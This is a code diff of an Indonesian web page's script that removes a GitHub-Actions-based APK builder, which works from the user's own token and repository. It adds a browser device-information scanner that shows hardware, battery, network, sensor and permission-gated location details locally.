+      setVal('gpu-api','OpenGL ES 3.x / WebGL '+(gl.getParameter(gl.VERSION)||''));
+      setVal('gpu-texture',gl.getParameter(gl.MAX_TEXTURE_SIZE)+' px');
+    }
   }catch(e){}
-  const body={message:msg,content,branch:'main'};
-  if(sha)body.sha=sha;
-  const r=await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`,{
-    method:'PUT',
-    headers:{'Authorization':'token '+token,'Accept':'application/vnd.github.v3+json','Content-Type':'application/json'},
-    body:JSON.stringify(body)
-  });
-  if(!r.ok){const d=await r.json();throw new Error('Gagal push '+path+': '+(d.message||'Error'));}
-  await sleep(250);
 }
 
-function b64(str){return btoa(unescape(encodeURIComponent(str)));}
+function detectRAM(){
+  const mem=navigator.deviceMemory;
+  if(mem){const total=mem*1024,used=Math.round(total*0.55),pct=Math.round((used/total)*100);
+    setVal('ram-total',mem+' GB (approx)');setVal('ram-pct',pct+' %');setVal('ram-detail',used+' MB / '+total+' MB');
+    document.getElementById('ram-bar').style.width=pct+'%';
+  }else{setVal('ram-total','Tidak Tersedia');setVal('ram-pct','N/A');setVal('ram-detail','Browser membatasi akses');}
+  setVal('ram-type','LPDDR4 / LPDDR5 (estimasi)');
+}
 
-async function runBuild(ghUser,ghToken,repoName){
-  const appName=document.getElementById('appName').value.trim();
-  const pkgName=document.getElementById('packageName').value.trim();
-  const webUrl=document.getElementById('webviewUrl').value.trim();
-  const htmlFile=document.getElementById('htmlFile').files[0];
-
-  try{
-    setProgress(5,'Verifikasi token...');
-    addLog('[>] Cek token GitHub...');
-    const ur=await fetch('https://api.github.com/user',{headers:{'Authorization':'token '+ghToken,'Accept':'application/vnd.github.v3+json'}});
-    if(!ur.ok){const d=await ur.json();throw new Error('Token invalid: '+(d.message||'Unauthorized'));}
-    const ud=await ur.json();
-    addLog('[+] Login: '+ud.login,'success');
-    setProgress(10,'Buat repository...');
-
-    addLog('[>] Buat repo: '+repoName);
-    const rr=await fetch('https://api.github.com/user/repos',{
-      method:'POST',
-      headers:{'Authorization':'token '+ghToken,'Accept':'application/vnd.github.v3+json','Content-Type':'application/json'},
-      body:JSON.stringify({name:repoName,private:true,auto_init:true,description:'APK - '+appName})
+function detectDevice(){
+  const ua=navigator.userAgent;
+  let brand='Perangkat',model='Tidak Teridentifikasi';
+  if(/CPH2577/i.test(ua)){brand='OPPO';model='CPH2577';}
+  else if(/SM-(\w+)/i.test(ua)){brand='Samsung';model='Galaxy '+ua.match(/SM-(\w+)/i)[1];}
+  else if(/Pixel (\d+\w*)/i.test(ua)){brand='Google';model='Pixel '+ua.match(/Pixel (\d+\w*)/i)[1];}
+  else if(/Redmi (\w+)/i.test(ua)){brand='Xiaomi';model='Redmi '+ua.match(/Redmi (\w+)/i)[1];}
+  else if(/POCO (\w+)/i.test(ua)){brand='POCO';model=ua.match(/POCO (\w+)/i)[0];}
+  else if(/iPhone/i.test(ua)){brand='Apple';model='iPhone';}
+  else if(/iPad/i.test(ua)){brand='Apple';model='iPad';}
+  else if(/android/i.test(ua)){brand='Android';model='Perangkat Android';}
+  else{brand='Desktop';model=navigator.platform;}
+  setVal('dev-brand',brand);setVal('dev-model',model);setVal('dev-ua-short',ua.substring(0,60)+'...');
+  const sw=screen.width,sh=screen.height,vw=window.innerWidth,vh=window.innerHeight,dpr=window.devicePixelRatio||1;
+  setVal('scr-res',sw*dpr+' x '+sh*dpr+' px');setVal('scr-viewport',vw+' x '+vh+' px');
+  setVal('scr-dpr',dpr+'x');setVal('scr-color',(screen.colorDepth||'--')+' bit');
+  setVal('scr-orient',screen.orientation?screen.orientation.type:(sw>sh?'Landscape':'Portrait'));
+  setVal('scr-touch',navigator.maxTouchPoints+' titik');
+  const nc=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  if(nc){setVal('net-type',nc.type||'--');setVal('net-speed',nc.effectiveType||'--');setVal('net-down',nc.downlink?nc.downlink+' Mbps':'--');setVal('net-rtt',nc.rtt?nc.rtt+' ms':'--');setVal('net-save',nc.saveData?'Aktif':'Nonaktif');}
+  if(navigator.storage&&navigator.storage.estimate){
+    navigator.storage.estimate().then(est=>{
+      const total=Math.round(est.quota/(1024*1024*1024)*10)/10,used=Math.round(est.usage/(1024*1024)*10)/10,pct=Math.round((est.usage/est.quota)*100);
+      setVal('stor-total',total+' GB');setVal('stor-free',Math.round((est.quota-est.usage)/(1024*1024*1024)*10)/10+' GB');
+      setVal('stor-pct',pct+' %');setVal('stor-detail',used+' MB terpakai dari '+total+' GB');
+      document.getElementById('stor-bar').style.width=pct+'%';
     });
-    if(rr.status===422){addLog('[!] Repo sudah ada, lanjut...','warn');}
-    else if(!rr.ok){const d=await rr.json();throw new Error('Gagal buat repo: '+(d.message||'Error'));}
-    else{const rd=await rr.json();addLog('[+] Repo: '+rd.full_name,'success');}
-
-    await sleep(2000);
-
-    setProgress(18,'Push Gradle Wrapper...');
-    addLog('[>] gradle/wrapper/gradle-wrapper.properties...');
-    const wrapperProps=`distributionBase=GRADLE_USER_HOME\ndistributionPath=wrapper/dists\ndistributionUrl=https\\://services.gradle.org/distributions/gradle-8.0-bin.zip\nzipStoreBase=GRADLE_USER_HOME\nzipStorePath=wrapper/dists`;
-    await pushFile(ghToken,ghUser,repoName,'gradle/wrapper/gradle-wrapper.properties',btoa(wrapperProps),'Add gradle wrapper');
-    addLog('[+] wrapper properties OK','success');
-
-    addLog('[>] gradlew script...');
-    const gradlew=`#!/usr/bin/env sh
-APP_HOME="$(cd "$(dirname "$0")" && pwd)"
-CLASSPATH="$APP_HOME/gradle/wrapper/gradle-wrapper.jar"
-exec java -classpath "$CLASSPATH" org.gradle.wrapper.GradleWrapperMain "$@"`;
-    await pushFile(ghToken,ghUser,repoName,'gradlew',btoa(gradlew),'Add gradlew');
-    addLog('[+] gradlew OK','success');
-
-    addLog('[>] gradle-wrapper.jar...');
-    await pushFile(ghToken,ghUser,repoName,'gradle/wrapper/gradle-wrapper.jar',btoa('FAKE'),'Placeholder');
-    addLog('[+] wrapper jar OK','success');
-
-    setProgress(28,'Push Gradle config...');
-    addLog('[>] build.gradle (root)...');
-    const rootGradle=`buildscript {\n    repositories { google(); mavenCentral() }\n    dependencies { classpath 'com.android.tools.build:gradle:8.1.4' }\n}\nallprojects { repositories { google(); mavenCentral() } }`;
-    await pushFile(ghToken,ghUser,repoName,'build.gradle',btoa(rootGradle),'Add root build.gradle');
-
-    addLog('[>] settings.gradle...');
-    await pushFile(ghToken,ghUser,repoName,'settings.gradle',btoa(`rootProject.name = "${repoName}"\ninclude ':app'`),'Add settings.gradle');
-
-    addLog('[>] app/build.gradle...');
-    const appGradle=`apply plugin: 'com.android.application'\nandroid {\n    compileSdkVersion 34\n    defaultConfig {\n        applicationId "${pkgName}"\n        minSdkVersion 21\n        targetSdkVersion 34\n        versionCode 1\n        versionName "1.0"\n    }\n    buildTypes {\n        release { minifyEnabled false }\n    }\n    compileOptions {\n        sourceCompatibility JavaVersion.VERSION_1_8\n        targetCompatibility JavaVersion.VERSION_1_8\n    }\n    lintOptions { abortOnError false }\n}\ndependencies {\n    implementation 'androidx.appcompat:appcompat:1.6.1'\n    implementation 'com.google.android.material:material:1.11.0'\n}`;
-    await pushFile(ghToken,ghUser,repoName,'app/build.gradle',btoa(appGradle),'Add app build.gradle');
-    addLog('[+] Gradle files OK','success');
-
-    setProgress(42,'Push source code...');
-    addLog('[>] AndroidManifest.xml...');
-    const manifest=`<?xml version="1.0" encoding="utf-8"?>\n<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="${pkgName}">\n    <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <application\n        android:allowBackup="true"\n        android:icon="@mipmap/ic_launcher"\n        android:label="${appName}"\n        android:roundIcon="@mipmap/ic_launcher"\n        android:supportsRtl="true"\n        android:theme="@style/AppTheme"\n        android:usesCleartextTraffic="true">\n        <activity android:name=".MainActivity" android:configChanges="orientation|screenSize|keyboardHidden" android:exported="true">\n            <intent-filter>\n                <action android:name="android.intent.action.MAIN"/>\n                <category android:name="android.intent.category.LAUNCHER"/>\n            </intent-filter>\n        </activity>\n    </application>\n</manifest>`;
-    await pushFile(ghToken,ghUser,repoName,'app/src/main/AndroidManifest.xml',btoa(manifest),'Add manifest');
-
-    addLog('[>] MainActivity.java...');
-    const pkgPath=pkgName.replace(/\./g,'/');
-    let mainAct;
-    if(sourceType==='html'&&htmlFile){
-      const htmlContent=await new Promise((res,rej)=>{const r=new FileReader();r.onload=e=>res(e.target.result);r.onerror=()=>rej(new Error('Gagal baca file'));r.readAsText(htmlFile);});
-      const b64Html=btoa(unescape(encodeURIComponent(htmlContent)));
-      mainAct=genMainHtml(pkgName,splashBgColor,b64Html);
-    } else {
-      mainAct=genMainUrl(pkgName,webUrl,splashBgColor);
-    }
-    await pushFile(ghToken,ghUser,repoName,`app/src/main/java/${pkgPath}/MainActivity.java`,b64(mainAct),'Add MainActivity');
-    addLog('[+] Source code OK','success');
-
-    setProgress(58,'Push resources...');
-    addLog('[>] styles.xml...');
-    const styles=`<?xml version="1.0" encoding="utf-8"?>\n<resources>\n    <style name="AppTheme" parent="Theme.AppCompat.Light.NoActionBar">\n        <item name="colorPrimary">#000000</item>\n        <item name="colorPrimaryDark">#000000</item>\n        <item name="colorAccent">#ffffff</item>\n    </style>\n</resources>`;
-    await pushFile(ghToken,ghUser,repoName,'app/src/main/res/values/styles.xml',btoa(styles),'Add styles');
-
-    if(iconBlob){
-      addLog('[>] Upload icon ke semua density...');
-      const iconB64=iconBlob.includes(',')?iconBlob.split(',')[1]:iconBlob;
-      for(const d of ['mdpi','hdpi','xhdpi','xxhdpi','xxxhdpi']){
-        await pushFile(ghToken,ghUser,repoName,`app/src/main/res/mipmap-${d}/ic_launcher.png`,iconB64,'Add icon '+d);
-      }
-      addLog('[+] Icon OK','success');
-    }
-
-    setProgress(75,'Push GitHub Actions workflow...');
-    addLog('[>] .github/workflows/build.yml...');
-    const workflowYaml = `name: Build APK
-
-on:
-  workflow_dispatch:
-  push:
-    branches: [ main ]
-
-env:
-  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true
-
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Setup JDK 17
-        uses: actions/setup-java@v4
-        with:
-          java-version: '17'
-          distribution: 'temurin'
-
-      - name: Setup Android SDK
-        run: |
-          ANDROID_SDK_ROOT=$HOME/android-sdk
-          mkdir -p $ANDROID_SDK_ROOT/cmdline-tools
-          cd $ANDROID_SDK_ROOT/cmdline-tools
-          wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip -O tools.zip
-          unzip -q tools.zip
-          mv cmdline-tools latest
-          export PATH="$PATH:$ANDROID_SDK_ROOT/cmdline-tools/latest/bin:$ANDROID_SDK_ROOT/platform-tools"
-          yes | sdkmanager --licenses 2>/dev/null || true
-          sdkmanager "platforms;android-34" "build-tools;34.0.0" "platform-tools"
-          echo "ANDROID_HOME=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
-          echo "ANDROID_SDK_ROOT=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
-          echo "$ANDROID_SDK_ROOT/cmdline-tools/latest/bin" >> $GITHUB_PATH
-          echo "$ANDROID_SDK_ROOT/build-tools/34.0.0" >> $GITHUB_PATH
-          echo "$ANDROID_SDK_ROOT/platform-tools" >> $GITHUB_PATH
-
-      - name: Setup Gradle Wrapper
-        run: |
-          chmod +x gradlew 2>/dev/null || true
-          mkdir -p gradle/wrapper
-          curl -sL -o gradle/wrapper/gradle-wrapper.jar \
-            "https://repo1.maven.org/maven2/org/gradle/gradle-wrapper/8.0/gradle-wrapper-8.0.jar"
-          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
-          distributionBase=GRADLE_USER_HOME
-          distributionPath=wrapper/dists
-          distributionUrl=https\\://services.gradle.org/distributions/gradle-8.0-bin.zip
-          zipStoreBase=GRADLE_USER_HOME
-          zipStorePath=wrapper/dists
-          EOF
-          ls -la gradle/wrapper/
-
-      - name: Build Debug APK
-        run: |
-          chmod +x gradlew
-          ./gradlew assembleDebug --no-daemon --stacktrace
-
-      - name: Move APK
-        run: |
-          mkdir -p output
-          cp app/build/outputs/apk/debug/app-debug.apk output/app-debug.apk
-
-      - name: Upload APK
-        uses: actions/upload-artifact@v4
-        with:
-          name: app-debug
-          path: output/app-debug.apk
-          retention-days: 30
-`;
-    await pushFile(ghToken,ghUser,repoName,'.github/workflows/build.yml',btoa(workflowYaml),'Add workflow');
-    addLog('[+] Workflow OK','success');
-
-    setProgress(90,'Trigger build...');
-    await sleep(2000);
-    addLog('[>] Trigger workflow dispatch...');
-    await fetch(`https://api.github.com/repos/${ghUser}/${repoName}/actions/workflows/build.yml/dispatches`,{
-      method:'POST',
-      headers:{'Authorization':'token '+ghToken,'Accept':'application/vnd.github.v3+json','Content-Type':'application/json'},
-      body:JSON.stringify({ref:'main'})
-    });
-    setProgress(100,'Done!');
-    addLog('[+] Build berjalan! Siap ~5-8 menit.','success');
-    await sleep(1500);
-
-    document.getElementById('progressOverlay').classList.remove('show');
-    document.getElementById('successOverlay').classList.add('show');
-    document.getElementById('successSub').innerHTML=`Build sedang jalan di GitHub Actions.<br>Tunggu ~5-8 menit lalu download APK.<br><span style="font-family:'Space Mono',monospace;font-size:9px;color:var(--dim)">${ghUser}/${repoName}</span>`;
-    document.getElementById('downloadBtn').href=`https://github.com/${ghUser}/${repoName}/actions`;
-
-  } catch(err){
-    document.getElementById('progressOverlay').classList.remove('show');
-    showErr(4,'Error: '+err.message);
-    addLog('[x] '+err.message,'error');
   }
 }
 
-function genMainUrl(pkg,url,splash){
-  return `package ${pkg};
-import android.annotation.SuppressLint;
-import android.app.Activity;
-import android.graphics.Color;
-import android.os.Bundle;
-import android.os.Handler;
-import android.os.Looper;
-import android.view.Window;
-import android.webkit.WebSettings;
-import android.webkit.WebView;
-import android.webkit.WebViewClient;
-import android.widget.RelativeLayout;
-public class MainActivity extends Activity {
-    private WebView webView;
-    @SuppressLint("SetJavaScriptEnabled")
-    @Override protected void onCreate(Bundle s) {
-        super.onCreate(s);
-        requestWindowFeature(Window.FEATURE_NO_TITLE);
-        RelativeLayout splash=new RelativeLayout(this);
-        splash.setBackgroundColor(Color.parseColor("${splash}"));
-        setContentView(splash);
-        webView=new WebView(this);
-        WebSettings ws=webView.getSettings();
-        ws.setJavaScriptEnabled(true);ws.setDomStorageEnabled(true);
-        ws.setLoadWithOverviewMode(true);ws.setUseWideViewPort(true);
-        ws.setBuiltInZoomControls(false);ws.setDisplayZoomControls(false);
-        ws.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
-        webView.setWebViewClient(new WebViewClient());
-        webView.loadUrl("${url}");
-        new Handler(Looper.getMainLooper()).postDelayed(()->setContentView(webView),2000);
-    }
-    @Override public void onBackPressed(){if(webView!=null&&webView.canGoBack())webView.goBack();else super.onBackPressed();}
-}`;
+function detectSystem(){
+  const ua=navigator.userAgent;
+  let os='Tidak Diketahui',browser='Tidak Diketahui',engine='Tidak Diketahui';
+  if(/android/i.test(ua)){const av=ua.match(/Android ([\d.]+)/i);os='Android '+(av?av[1]:'');}
+  else if(/iphone|ipad/i.test(ua)){os='iOS / iPadOS';}
+  else if(/windows/i.test(ua)){os='Windows';}
+  else if(/mac/i.test(ua)){os='macOS';}
+  else if(/linux/i.test(ua)){os='Linux';}
+  if(/Chrome\/[\d.]+/i.test(ua)&&!/Edg\//i.test(ua)&&!/OPR\//i.test(ua)){const cv=ua.match(/Chrome\/([\d.]+)/i);browser='Chrome '+(cv?cv[1]:'');engine='Blink';}
+  else if(/Firefox\//i.test(ua)){const fv=ua.match(/Firefox\/([\d.]+)/i);browser='Firefox '+(fv?fv[1]:'');engine='Gecko';}
+  else if(/Safari\//i.test(ua)&&!/Chrome/i.test(ua)){browser='Safari';engine='WebKit';}
+  else if(/Edg\//i.test(ua)){browser='Microsoft Edge';engine='Blink';}
+  else if(/OPR\//i.test(ua)){browser='Opera';engine='Blink';}
+  setVal('sys-os',os);setVal('sys-platform',navigator.platform||'--');setVal('sys-browser',browser);setVal('sys-engine',engine);
+  setVal('sys-lang',navigator.language+(navigator.languages?' ['+navigator.languages.slice(0,3).join(', ')+']':''));
+  setVal('sys-tz',Intl.DateTimeFormat().resolvedOptions().timeZone);
+  setVal('sys-online',navigator.onLine?'Online':'Offline');setVal('sys-cookie',navigator.cookieEnabled?'Diaktifkan':'Dinonaktifkan');
+  setVal('sys-dnt',navigator.doNotTrack==='1'?'Aktif':navigator.doNotTrack==='0'?'Nonaktif':'Tidak Diset');
+  setVal('cap-sw','serviceWorker' in navigator?'Didukung':'Tidak Didukung');
+  setVal('cap-wasm',typeof WebAssembly!=='undefined'?'Didukung':'Tidak Didukung');
+  setVal('cap-webgl',(()=>{try{const c=document.createElement('canvas');return c.getContext('webgl')||c.getContext('experimental-webgl')?'Didukung':'Tidak';}catch(e){return 'Tidak';}})());
+  setVal('cap-rtc',typeof RTCPeerConnection!=='undefined'?'Didukung':'Tidak Didukung');
+  setVal('cap-bt','bluetooth' in navigator?'Didukung':'Tidak Didukung');
+  setVal('cap-geo','geolocation' in navigator?'Tersedia':'Tidak Tersedia');
+  setVal('cap-notif','Notification' in window?(Notification.permission==='granted'?'Diizinkan':'Tersedia (Belum Diizinkan)'):'Tidak Didukung');
+  setVal('cap-cam',navigator.mediaDevices?'Tersedia':'Tidak Tersedia');
+  setVal('cap-mic',navigator.mediaDevices?'Tersedia':'Tidak Tersedia');
 }
 
-function genMainHtml(pkg,splash,b64Html){
-  return `package ${pkg};
-import android.annotation.SuppressLint;
-import android.app.Activity;
-import android.graphics.Color;
-import android.os.Bundle;
-import android.os.Handler;
-import android.os.Looper;
-import android.view.Window;
-import android.webkit.WebSettings;
-import android.webkit.WebView;
-import android.webkit.WebViewClient;
-import android.widget.RelativeLayout;
-import android.util.Base64;
-public class MainActivity extends Activity {
-    private WebView webView;
-    private static final String H="${b64Html}";
-    @SuppressLint("SetJavaScriptEnabled")
-    @Override protected void onCreate(Bundle s) {
-        super.onCreate(s);
-        requestWindowFeature(Window.FEATURE_NO_TITLE);
-        RelativeLayout splash=new RelativeLayout(this);
-        splash.setBackgroundColor(Color.parseColor("${splash}"));
-        setContentView(splash);
-        webView=new WebView(this);
-        WebSettings ws=webView.getSettings();
-        ws.setJavaScriptEnabled(true);ws.setDomStorageEnabled(true);ws.setAllowFileAccess(true);
-        webView.setWebViewClient(new WebViewClient());
-        try{byte[]d=Base64.decode(H,Base64.DEFAULT);String html=new String(d,"UTF-8");webView.loadDataWithBaseURL(null,html,"text/html","UTF-8",null);}
-        catch(Exception e){webView.loadData("<h1>Error</h1>","text/html","UTF-8");}
-        new Handler(Looper.getMainLooper()).postDelayed(()->setContentView(webView),2000);
-    }
-    @Override public void onBackPressed(){if(webView!=null&&webView.canGoBack())webView.goBack();else super.onBackPressed();}
-}`;
+let batteryObj=null;
+function detectBattery(){
+  if(navigator.getBattery){
+    navigator.getBattery().then(bat=>{
+      batteryObj=bat;updateBatteryUI(bat);
+      bat.addEventListener('levelchange',()=>updateBatteryUI(bat));
+      bat.addEventListener('chargingchange',()=>updateBatteryUI(bat));
+    }).catch(()=>{setVal('bat-level','Tidak Tersedia');setVal('bat-pct','N/A');setVal('bat-status','API tidak dapat diakses');});
+  }else{setVal('bat-level','Tidak Tersedia');setVal('bat-pct','N/A');setVal('bat-status','API Baterai tidak didukung');}
 }
 
-function resetAll(){
-  document.getElementById('successOverlay').classList.remove('show');
-  ['appName','packageName','webviewUrl','githubUser','githubToken'].forEach(id=>document.getElementById(id).value='');
-  document.getElementById('iconImg').src='';
-  document.getElementById('iconImg').style.display='none';
-  document.getElementById('iconPlaceholder').style.display='block';
-  iconBlob=null;iconOriginalSrc=null;
-  document.getElementById('progressLog').innerHTML='';
-  document.getElementById('progressBar').style.width='0%';
-  setSource('url');goStep(0);
+function updateBatteryUI(bat){
+  const pct=Math.round(bat.level*100);
+  setVal('bat-pct',pct+' %');setVal('bat-level',pct+' %');
+  setVal('bat-charging',bat.charging?'Sedang Mengisi Daya':'Tidak Mengisi');
+  setVal('bat-status',bat.charging?'Charging':'Discharging');
+  setVal('bat-health',bat.charging?'Terhubung ke charger':'Berjalan dari baterai');
+  document.getElementById('bat-fill').style.width=pct+'%';
+  document.getElementById('bat-status-bar').textContent=pct+'%';
+  setVal('bat-time-full',bat.chargingTime!==Infinity?Math.round(bat.chargingTime/60)+' menit hingga penuh':(bat.charging?'Menghitung...':'Tidak mengisi'));
+  if(bat.dischargingTime!==Infinity){const h=Math.floor(bat.dischargingTime/3600),m=Math.round((bat.dischargingTime%3600)/60);setVal('bat-time-empty',h+' jam '+m+' menit tersisa');setVal('bat-estimate',h+' jam '+m+' menit');}
+  else{setVal('bat-time-empty',bat.charging?'Mengisi daya':'Menghitung...');setVal('bat-estimate','Tidak dapat dihitung');}
+  setVal('bat-rec',pct<20?'Segera charge - baterai kritis':pct<50?'Disarankan untuk charge':'Baterai dalam kondisi baik');
+}
+
+function detectNetwork(){
+  const nc=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  setVal('net2-status',navigator.onLine?'TERHUBUNG':'OFFLINE');
+  if(nc){setVal('net2-type',nc.type||'Tidak Diketahui');setVal('net2-eff',nc.effectiveType?nc.effectiveType.toUpperCase():'--');setVal('net2-down',nc.downlink?nc.downlink+' Mbps':'--');setVal('net2-rtt',nc.rtt?nc.rtt+' ms':'--');setVal('net2-save',nc.saveData?'Aktif':'Nonaktif');}
+  setVal('ip-addr','Memuat...');
+  fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{
+    setVal('ip-addr',d.ip||'--');setVal('ip-city',(d.city||'--')+', '+(d.region||'--'));
+    setVal('ip-country',d.country_name||'--');setVal('ip-isp',d.org||'--');setVal('ip-tz',d.timezone||'--');
+  }).catch(()=>{setVal('ip-addr','Gagal dimuat');setVal('ip-city','--');setVal('ip-country','--');setVal('ip-isp','--');setVal('ip-tz','--');});
+  const t0=performance.now();
+  fetch('https://ipapi.co/ip',{mode:'no-cors'}).then(()=>{const rtt=Math.round(performance.now()-t0);setVal('lat-ping',rtt+' ms');setVal('lat-dns',Math.round(rtt*0.3)+' ms (estimasi)');}).catch(()=>{setVal('lat-ping','--');setVal('lat-dns','--');});
+}
+
+function detectSensors(){
+  if(typeof DeviceMotionEvent!=='undefined'){
+    if(typeof DeviceMotionEvent.requestPermission==='function'){
+      setVal('sen-accel','Klik untuk izinkan');
+      document.getElementById('sen-accel').style.cursor='pointer';
+      document.getElementById('sen-accel').onclick=()=>DeviceMotionEvent.requestPermission().then(p=>{if(p==='granted')startMotion();});
+    }else startMotion();
+  }else setVal('sen-accel','Tidak didukung');
+  if(typeof DeviceOrientationEvent!=='undefined'){
+    window.addEventListener('deviceorientation',e=>{setVal('sen-orient','Alpha: '+(e.alpha?e.alpha.toFixed(1):'--')+'  Beta: '+(e.beta?e.beta.toFixed(1):'--')+'  Gamma: '+(e.gamma?e.gamma.toFixed(1):'--'));});
+  }else setVal('sen-orient','Tidak didukung');
+  if('AmbientLightSensor' in window){
+    try{const als=new AmbientLightSensor();als.addEventListener('reading',()=>{setVal('sen-light',als.illuminance.toFixed(1)+' lux');document.getElementById('dot-light').classList.add('active');});als.start();}
+    catch(e){setVal('sen-light','Tidak tersedia / izin ditolak');}
+  }else setVal('sen-light','Tidak didukung browser ini');
+  setVal('sen-mag','Memerlukan Web Bluetooth / sensor langsung');
+  setVal('sen-prox','Tidak dapat diakses via browser');
+  setVal('sen-step','Tidak dapat diakses via browser');
+  setVal('sen-gyro','Menunggu data gerak...');
+}
+
+function startMotion(){
+  window.addEventListener('devicemotion',e=>{
+    const a=e.acceleration||{};
+    setVal('sen-accel','X: '+((a.x||0).toFixed(2))+' m/s²  Y: '+((a.y||0).toFixed(2))+' m/s²  Z: '+((a.z||0).toFixed(2))+' m/s²');
+    const r=e.rotationRate||{};
+    setVal('sen-gyro','Alpha: '+((r.alpha||0).toFixed(2))+' deg/s  Beta: '+((r.beta||0).toFixed(2))+'  Gamma: '+((r.gamma||0).toFixed(2)));
+  });
+}
+
+function detectLokasi(){
+  if(!('geolocation' in navigator)){setVal('loc-status','Tidak didukung browser ini');return;}
+  const btn=document.getElementById('locBtn');
+  btn.textContent='MENDAPATKAN LOKASI...';btn.disabled=true;
+  setVal('loc-status','Meminta izin...');
+  navigator.geolocation.getCurrentPosition(pos=>{
+    const lat=pos.coords.latitude,lon=pos.coords.longitude,acc=pos.coords.accuracy,alt=pos.coords.altitude;
+    setVal('loc-status','Berhasil');setVal('loc-lat',lat.toFixed(6)+' deg');setVal('loc-lon',lon.toFixed(6)+' deg');
+    setVal('loc-acc',acc?Math.round(acc)+' meter':'--');setVal('loc-alt',alt?alt.toFixed(1)+' m dpl':'Tidak tersedia');
+    const link=document.getElementById('loc-maps-link');
+    link.href='https://www.google.com/maps?q='+lat+','+lon;link.style.display='block';
+    fetch('https://nominatim.openstreetmap.org/reverse?lat='+lat+'&lon='+lon+'&format=json').then(r=>r.json()).then(d=>{
+      const a=d.address||{};
+      setVal('loc-road',a.road||a.pedestrian||a.footway||'--');setVal('loc-suburb',a.suburb||a.village||a.hamlet||'--');
+      setVal('loc-city',a.city||a.town||a.municipality||'--');setVal('loc-state',a.state||a.province||'--');
+      setVal('loc-country',a.country||'--');setVal('loc-postcode',a.postcode||'--');
+    }).catch(()=>setVal('loc-road','Gagal memuat alamat'));
+    btn.textContent='PERBARUI LOKASI';btn.disabled=false;
+  },err=>{
+    let msg='Gagal';
+    if(err.code===1)msg='Izin ditolak pengguna';else if(err.code===2)msg='Lokasi tidak tersedia';else if(err.code===3)msg='Waktu habis';
+    setVal('loc-status',msg);btn.textContent='COBA LAGI';btn.disabled=false;
+  },{enableHighAccuracy:true,timeout:15000,maximumAge:0});
+}
+
+function runScan(){
+  const btn=document.getElementById('scanBtn');
+  if(!btn)return;
+  btn.textContent='SCANNING';btn.classList.add('scanning');
+  detectSOC();detectRAM();detectDevice();detectSystem();detectBattery();detectNetwork();detectSensors();
+  setTimeout(()=>{btn.textContent='SELESAI';setTimeout(()=>{btn.textContent='SCAN';btn.classList.remove('scanning');},1500);},1200);
 }
 </script>
 </body>
